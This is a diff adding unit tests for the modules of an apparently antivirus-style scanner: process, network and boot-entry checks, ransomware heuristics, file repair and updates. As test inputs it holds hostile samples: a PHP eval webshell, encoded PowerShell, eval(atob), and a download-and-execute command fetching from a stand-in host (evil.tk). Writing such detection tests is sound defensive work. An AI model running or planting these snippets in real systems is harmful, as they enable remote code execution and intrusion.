@@ -1351,3 +1351,451 @@ async function auditFalsePositiveFix() {
 }
 
 setTimeout(() => { auditFalsePositiveFix().catch((e) => { console.error(e); process.exit(1); }); }, 400);
+
+async function auditProModules() {
+  const T = [
+    // ---------- Exclusions ----------
+    ['pro: exclusions add/remove/list/clear', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('exclusions.js', sandbox);
+      const E = sandbox.Exclusions;
+      assert(E.add('C:\\Tools\\*') === true);
+      assert(E.add('C:\\Tools\\*') === true, 'idempotent');
+      assert(E.list().length === 1);
+      assert(E.add('') === false && E.add(42) === false);
+      assert(E.remove('C:\\Tools\\*') === true);
+      assert(E.list().length === 0);
+    }],
+    ['pro: exclusions glob matching', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('exclusions.js', sandbox);
+      const E = sandbox.Exclusions;
+      assert(E.matches('C:\\x\\a.log', 'a.log', ['*.log']) === true);
+      assert(E.matches('C:\\x\\a.exe', 'a.exe', ['*.log']) === false);
+      assert(E.matches('/home/u/photo.JPG', 'photo.JPG', ['*.jpg']) === true, 'case-insensitive');
+      assert(E.matches('C:\\Tools\\app.exe', 'app.exe', ['C:\\Tools\\*']) === true);
+      assert(E.matches('C:\\Other\\app.exe', 'app.exe', ['C:\\Tools\\*']) === false);
+    }],
+    ['pro: exclusions substring matching', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('exclusions.js', sandbox);
+      const E = sandbox.Exclusions;
+      assert(E.matches('/home/u/node_modules/x/index.js', 'index.js', ['node_modules']) === true);
+      assert(E.matches('/home/u/src/a.ts', 'a.ts', ['node_modules']) === false);
+    }],
+    ['pro: exclusions normalize rejects junk', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('exclusions.js', sandbox);
+      const E = sandbox.Exclusions;
+      assert(E.normalize('') === null);
+      assert(E.normalize(42) === null);
+      assert(E.normalize('x'.repeat(2000)) === null);
+      assert(E.normalize('glob:*.tmp') === '*.tmp');
+    }],
+    ['pro: scanner skips excluded files', async () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const files = [
+        { path: '/a/eicar.com', name: 'eicar.com', size: 68 },
+        { path: '/a/skip.com', name: 'skip.com', size: 68 },
+      ];
+      const readHead = async () => eicarBytes();
+      const { results } = await Sc.scanFiles(files, readHead, null, { isExcluded: (p) => p.includes('skip') });
+      assert(results.length === 1, 'excluded file skipped, got ' + results.length);
+      assert(results[0].path === '/a/eicar.com');
+    }],
+    // ---------- ProcessGuard ----------
+    ['pro: process — mimikatz flagged malicious', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('processguard.js', sandbox);
+      const P = sandbox.ProcessGuard;
+      const r = P.analyzeProcess({ pid: 1, name: 'mimikatz.exe', path: 'C:\\Temp\\mimikatz.exe' });
+      assert(r.risk === 'malicious' && r.score >= 70, r.risk + ' ' + r.score);
+    }],
+    ['pro: process — powershell download-exec from temp is malicious', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('processguard.js', sandbox);
+      const P = sandbox.ProcessGuard;
+      const r = P.analyzeProcess({ pid: 2, name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmdline: 'powershell -enc AAAA', parentName: 'WINWORD.EXE' });
+      assert(r.risk === 'malicious' || r.risk === 'suspicious', r.risk);
+      assert(r.findings.some((f) => f.includes('LOLBIN')));
+    }],
+    ['pro: process — normal app is clean', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('processguard.js', sandbox);
+      const P = sandbox.ProcessGuard;
+      const r = P.analyzeProcess({ pid: 3, name: 'chrome.exe', path: 'C:\\Program Files\\Chrome\\chrome.exe', signer: 'Google LLC' });
+      assert(r.risk === 'clean' && r.score === 0, r.risk + ' ' + r.score);
+    }],
+    ['pro: process — exe from temp flagged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('processguard.js', sandbox);
+      const P = sandbox.ProcessGuard;
+      const r = P.analyzeProcess({ pid: 4, name: 'setup.exe', path: 'C:\\Users\\u\\AppData\\Local\\Temp\\setup.exe' });
+      assert(r.findings.some((f) => f.includes('temp')), r.findings.join('|'));
+      assert(r.risk !== 'clean');
+    }],
+    ['pro: process — office spawning non-standard child', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('processguard.js', sandbox);
+      const P = sandbox.ProcessGuard;
+      const r = P.analyzeProcess({ pid: 5, name: 'updater.exe', path: 'C:\\Users\\u\\AppData\\Roaming\\updater.exe', parentName: 'WINWORD.EXE' });
+      assert(r.findings.some((f) => f.includes('office/browser spawned')), r.findings.join('|'));
+    }],
+    ['pro: process — scanProcesses summary counts', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('processguard.js', sandbox);
+      const P = sandbox.ProcessGuard;
+      const { summary } = P.scanProcesses([
+        { pid: 1, name: 'chrome.exe', path: 'C:\\Chrome\\chrome.exe' },
+        { pid: 2, name: 'mimikatz.exe', path: 'C:\\Temp\\m.exe' },
+        null, 'junk',
+      ]);
+      assert(summary.total === 2 && summary.malicious >= 1, JSON.stringify(summary));
+    }],
+    ['pro: process — normalizeProc rejects junk', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('processguard.js', sandbox);
+      const P = sandbox.ProcessGuard;
+      assert(P.normalizeProc(null) === null);
+      assert(P.normalizeProc({}) === null);
+      assert(P.analyzeProcess(null) === null);
+    }],
+    // ---------- NetGuard ----------
+    ['pro: net — C2 port from powershell is malicious', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('netguard.js', sandbox);
+      const N = sandbox.NetGuard;
+      const r = N.analyzeConn({ pid: 1, process: 'powershell.exe', local: '192.168.1.5', localPort: 50000, remote: '45.33.22.11', remotePort: 4444, state: 'established' });
+      assert(r.risk === 'malicious' && r.score >= 70, r.risk + ' ' + r.score);
+      assert(r.findings.some((f) => f.includes('C2 port')));
+    }],
+    ['pro: net — suspicious TLD flagged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('netguard.js', sandbox);
+      const N = sandbox.NetGuard;
+      const r = N.analyzeConn({ pid: 1, process: 'chrome.exe', remote: 'evil.tk', remotePort: 443, state: 'established' });
+      assert(r.findings.some((f) => f.includes('suspicious TLD')), r.findings.join('|'));
+    }],
+    ['pro: net — private IP not flagged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('netguard.js', sandbox);
+      const N = sandbox.NetGuard;
+      const r = N.analyzeConn({ pid: 1, process: 'app.exe', remote: '192.168.1.10', remotePort: 8080, state: 'established' });
+      assert(r.risk === 'clean', r.risk + ' ' + r.score);
+    }],
+    ['pro: net — known-good host clean', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('netguard.js', sandbox);
+      const N = sandbox.NetGuard;
+      const r = N.analyzeConn({ pid: 1, process: 'update.exe', remote: 'windowsupdate.com', remotePort: 443, state: 'established' });
+      assert(r.score === 0 && r.risk === 'clean', r.risk + ' ' + r.score);
+    }],
+    ['pro: net — exe from temp connecting out flagged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('netguard.js', sandbox);
+      const N = sandbox.NetGuard;
+      const r = N.analyzeConn({ pid: 1, process: 'C:\\Users\\u\\AppData\\Local\\Temp\\x.exe', remote: '1.2.3.4', remotePort: 443, state: 'established' });
+      assert(r.risk !== 'clean' && r.findings.length >= 2, r.risk + ' ' + r.findings.join('|'));
+    }],
+    ['pro: net — scanConnections summary', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('netguard.js', sandbox);
+      const N = sandbox.NetGuard;
+      const { summary } = N.scanConnections([
+        { process: 'a.exe', remote: '1.1.1.1', remotePort: 4444, state: 'established' },
+        { process: 'b.exe', remote: '8.8.8.8', remotePort: 53, state: 'established' },
+      ]);
+      assert(summary.total === 2 && summary.malicious >= 1, JSON.stringify(summary));
+    }],
+    ['pro: net — hostOf parses addr:port and brackets', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('netguard.js', sandbox);
+      const N = sandbox.NetGuard;
+      assert(N.hostOf('1.2.3.4:443') === '1.2.3.4');
+      assert(N.hostOf('[::1]:8080') === '::1');
+      assert(N.isPrivate('10.0.0.1') && N.isPrivate('192.168.1.1') && !N.isPrivate('8.8.8.8'));
+    }],
+    // ---------- Scheduler ----------
+    ['pro: scheduler add/toggle/remove', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('scheduler.js', sandbox);
+      const S = sandbox.Scheduler;
+      const j = S.addJob({ name: 'Daily', type: 'quick', interval: 'daily' });
+      assert(j.id && j.enabled && j.nextRun > Date.now());
+      assert(S.list().length === 1);
+      assert(S.toggleJob(j.id, false) === true);
+      assert(S.list()[0].enabled === false);
+      assert(S.dueJobs().length === 0, 'paused job not due');
+      assert(S.toggleJob(j.id, true) === true);
+      assert(S.removeJob(j.id) === true);
+      assert(S.list().length === 0);
+    }],
+    ['pro: scheduler dueJobs + markRun reschedules', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('scheduler.js', sandbox);
+      const S = sandbox.Scheduler;
+      const j = S.addJob({ name: 'H', type: 'quick', interval: 'hourly' });
+      S.setNextRun(j.id, Date.now() - 1000);
+      const due = S.dueJobs();
+      assert(due.length === 1, 'job due, got ' + due.length);
+      S.markRun(j.id);
+      assert(S.dueJobs().length === 0, 'rescheduled');
+      assert(S.list()[0].nextRun > Date.now());
+      assert(S.list()[0].lastRun > 0);
+    }],
+    ['pro: scheduler rejects invalid interval/type', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('scheduler.js', sandbox);
+      const S = sandbox.Scheduler;
+      const j = S.addJob({ name: 'x', interval: 'yearly', type: 'weird' });
+      assert(j.interval === S.INTERVALS.daily, 'falls back to daily');
+      assert(j.type === 'custom');
+      assert(S.addJob(null) === null);
+    }],
+    ['pro: scheduler nextRunLabel formats', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('scheduler.js', sandbox);
+      const S = sandbox.Scheduler;
+      const now = Date.now();
+      assert(S.nextRunLabel({ enabled: false, nextRun: now }, now) === 'paused');
+      assert(S.nextRunLabel({ enabled: true, nextRun: now + 5000 }, now) === 'due now');
+      assert(S.nextRunLabel({ enabled: true, nextRun: now + 3600000 }, now) === 'in 1 h');
+      assert(S.nextRunLabel({ enabled: true, nextRun: now + 86400000 }, now) === 'in 1 d');
+    }],
+    // ---------- RansomGuard ----------
+    ['pro: ransom — crypto extension detected', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('ransomware.js', sandbox);
+      const R = sandbox.RansomGuard;
+      assert(R.isCryptoExt('photo.jpg.locked') === true);
+      assert(R.isCryptoExt('photo.jpg.wcry') === true);
+      assert(R.isCryptoExt('photo.jpg') === false);
+    }],
+    ['pro: ransom — note names detected', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('ransomware.js', sandbox);
+      const g = sandbox.RansomGuard.createGuard();
+      assert(g.isRansomNote('HOW_TO_DECRYPT.txt') === true);
+      assert(g.isRansomNote('readme.html') === true);
+      assert(g.isRansomNote('notes.txt') === false);
+    }],
+    ['pro: ransom — burst trips alert', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('ransomware.js', sandbox);
+      const g = sandbox.RansomGuard.createGuard();
+      for (let i = 0; i < sandbox.RansomGuard.BURST_THRESHOLD; i++) {
+        g.recordRename({ path: '/d/f' + i, name: 'f' + i, newName: 'f' + i + '.locked' });
+      }
+      assert(g.state.tripped === true);
+      const a = g.assess();
+      assert(a.risk === 'high' && a.score === 80, a.risk + ' ' + a.score);
+    }],
+    ['pro: ransom — note file trips critical', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('ransomware.js', sandbox);
+      const g = sandbox.RansomGuard.createGuard();
+      g.recordNewFile({ path: '/d/HOW_TO_DECRYPT.txt', name: 'HOW_TO_DECRYPT.txt' });
+      assert(g.state.tripped === true);
+      const a = g.assess();
+      assert(a.risk === 'high' && a.notes === 1, JSON.stringify(a));
+    }],
+    ['pro: ransom — reset clears state', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('ransomware.js', sandbox);
+      const g = sandbox.RansomGuard.createGuard();
+      g.recordNewFile({ path: '/d/HOW_TO_DECRYPT.txt', name: 'HOW_TO_DECRYPT.txt' });
+      g.reset();
+      assert(g.state.tripped === false && g.state.events.length === 0);
+    }],
+    ['pro: ransom — status shape', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('ransomware.js', sandbox);
+      const g = sandbox.RansomGuard.createGuard();
+      g.addProtectedDir('/home/u/Documents');
+      const st = g.status();
+      assert(st.enabled === true && st.protectedDirs.includes('/home/u/Documents'));
+      assert(st.assessment.risk === 'clean');
+    }],
+    // ---------- Repair ----------
+    ['pro: repair — php webshell removed', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('repair.js', sandbox);
+      const R = sandbox.Repair;
+      const dirty = '<?php echo "ok"; eval($_POST["c"]); ?>';
+      const { text, changed, removed } = R.repairText(dirty);
+      assert(changed === true && !text.includes('eval($_POST'), text);
+      assert(removed.includes('php webshell block'));
+    }],
+    ['pro: repair — powershell -enc removed', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('repair.js', sandbox);
+      const R = sandbox.Repair;
+      const dirty = 'Write-Host hi; powershell -enc ' + 'A'.repeat(60);
+      const { text, changed } = R.repairText(dirty);
+      assert(changed && !text.includes('-enc'), text);
+    }],
+    ['pro: repair — js eval(atob) removed', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('repair.js', sandbox);
+      const R = sandbox.Repair;
+      const { text, changed } = R.repairText('var x = 1; eval(atob("AAAA"));');
+      assert(changed && !text.includes('eval(atob'), text);
+    }],
+    ['pro: repair — clean file unchanged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('repair.js', sandbox);
+      const R = sandbox.Repair;
+      const { changed, removed } = R.repairText('hello world\n');
+      assert(changed === false && removed.length === 0);
+    }],
+    ['pro: repair — canRepair rejects binaries/huge', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('repair.js', sandbox);
+      const R = sandbox.Repair;
+      assert(R.canRepair('a.exe', strBytes('MZ')).ok === false);
+      assert(R.canRepair('a.js', new Uint8Array(6 * 1024 * 1024)).ok === false);
+      assert(R.canRepair('a.js', strBytes('x')).ok === true);
+    }],
+    ['pro: repair — bytes roundtrip', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('repair.js', sandbox);
+      const R = sandbox.Repair;
+      const dirty = strBytes('<?php eval($_GET["x"]); ?>ok');
+      const { bytes, changed } = R.repairBytes(dirty);
+      assert(changed === true);
+      assert(R.bytesToText(bytes).includes('ok'));
+    }],
+    // ---------- Updater ----------
+    ['pro: updater — version compare', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('updater.js', sandbox);
+      const U = sandbox.Updater;
+      assert(U.compareVersions('2025.11.01-1', '2025.10.26-1') > 0);
+      assert(U.compareVersions('2025.10.26-2', '2025.10.26-1') > 0);
+      assert(U.compareVersions('2025.10.26-1', '2025.10.26-1') === 0);
+      assert(U.compareVersions('bad', '2025.10.26-1') === 0);
+      assert(U.parseVersion('2025.10.26-1').n === 1);
+      assert(U.parseVersion('nope') === null);
+    }],
+    ['pro: updater — needsUpdate detects newer', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('updater.js', sandbox);
+      const U = sandbox.Updater;
+      const r = U.needsUpdate({ version: '2099.01.01-1', signatures: 500, sha256: 'ab'.repeat(32) });
+      assert(r.update === true && r.available === '2099.01.01-1');
+      const r2 = U.needsUpdate({ version: '2000.01.01-1' });
+      assert(r2.update === false);
+      assert(U.needsUpdate(null).update === false);
+      assert(U.needsUpdate({ version: 'garbage' }).update === false);
+    }],
+    ['pro: updater — recordCheck updates version', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('updater.js', sandbox);
+      const U = sandbox.Updater;
+      U.stageUpdate('2099.01.01-1');
+      U.recordCheck('ok');
+      const s = U.status();
+      assert(s.currentVersion === '2099.01.01-1' && s.pendingVersion === '');
+      assert(s.lastResult === 'ok' && s.lastCheck > 0);
+    }],
+    ['pro: updater — autoUpdate toggle', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('updater.js', sandbox);
+      const U = sandbox.Updater;
+      U.setAutoUpdate(false);
+      assert(U.status().autoUpdate === false);
+      U.setAutoUpdate(true);
+      assert(U.status().autoUpdate === true);
+    }],
+    // ---------- BootGuard ----------
+    ['pro: boot — suspicious Run value flagged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('bootguard.js', sandbox);
+      const B = sandbox.BootGuard;
+      const r = B.analyzeEntry({ location: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'Updater', value: 'powershell -enc ' + 'A'.repeat(60) });
+      assert(r.risk !== 'clean', r.risk);
+      assert(r.findings.length >= 1, r.findings.join('|'));
+    }],
+    ['pro: boot — download-exec URL flagged hard', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('bootguard.js', sandbox);
+      const B = sandbox.BootGuard;
+      const r = B.analyzeEntry({ location: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'Svc', value: 'cmd /c powershell -c "iwr http://evil.tk/x.ps1|iex"' });
+      assert(r.score >= 50, 'score ' + r.score);
+      assert(r.findings.some((f) => f.includes('download-and-execute')), r.findings.join('|'));
+    }],
+    ['pro: boot — known app is clean', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('bootguard.js', sandbox);
+      const B = sandbox.BootGuard;
+      const r = B.analyzeEntry({ location: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'SecurityHealth', value: '%windir%\\system32\\SecurityHealthSystray.exe' });
+      assert(r.risk === 'clean', r.risk + ' ' + r.score);
+    }],
+    ['pro: boot — AppData hidden exe flagged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('bootguard.js', sandbox);
+      const B = sandbox.BootGuard;
+      const r = B.analyzeEntry({ location: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'OneDrive', value: 'C:\\Users\\u\\AppData\\Roaming\\abc123\\update.exe' });
+      assert(r.findings.some((f) => f.includes('AppData') || f.includes('persistence')), r.findings.join('|'));
+    }],
+    ['pro: boot — script in Startup folder flagged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('bootguard.js', sandbox);
+      const B = sandbox.BootGuard;
+      const r = B.analyzeEntry({ location: 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', name: 'helper.vbs', value: 'C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.vbs', type: 'startup-folder' });
+      assert(r.findings.some((f) => f.includes('Startup folder')), r.findings.join('|'));
+    }],
+    ['pro: boot — masquerading name flagged', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('bootguard.js', sandbox);
+      const B = sandbox.BootGuard;
+      const r = B.analyzeEntry({ location: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'svchost', value: 'C:\\Users\\u\\AppData\\Local\\Temp\\svchost.exe' });
+      assert(r.findings.some((f) => f.includes('masquerading')), r.findings.join('|'));
+    }],
+    ['pro: boot — scanEntries summary', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('bootguard.js', sandbox);
+      const B = sandbox.BootGuard;
+      const { summary } = B.scanEntries([
+        { location: 'HKLM\\...\\Run', name: 'SecurityHealth', value: '%windir%\\system32\\SecurityHealthSystray.exe' },
+        { location: 'HKCU\\...\\Run', name: 'X', value: 'powershell -enc ' + 'A'.repeat(60) },
+        null,
+      ]);
+      assert(summary.total === 2 && summary.flagged.length >= 1, JSON.stringify(summary));
+    }],
+    // ---------- .diff fix ----------
+    ['pro: .diff/.patch files are source context', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const r = Sc.analyzeBytes('fix.diff', strBytes('--- a/app.py\n+++ b/app.py\n+ransom note test'), 60, '/home/x/fix.diff');
+      assert(r.verdict === 'clean', '.diff -> clean, got ' + r.verdict);
+      const r2 = Sc.analyzeBytes('x.patch', strBytes('Invoke-WebRequest http://x | iex'), 40, '/home/x/x.patch');
+      assert(r2.verdict === 'clean', '.patch -> clean, got ' + r2.verdict);
+    }],
+  ];
+  let pass = 0, fail = 0;
+  for (const [name, fn] of T) {
+    try { await fn(); pass++; console.log('  ✔ ' + name); }
+    catch (e) { fail++; console.log('  ✕ ' + name + ': ' + e.message); }
+  }
+  console.log(`\n[audit pro-modules] ${pass} passed, ${fail} failed`);
+  if (fail) process.exit(1);
+  console.log('[audit pro-modules] all pro-module tests passed ✔');
+}
+
+setTimeout(() => { auditProModules().catch((e) => { console.error(e); process.exit(1); }); }, 500);
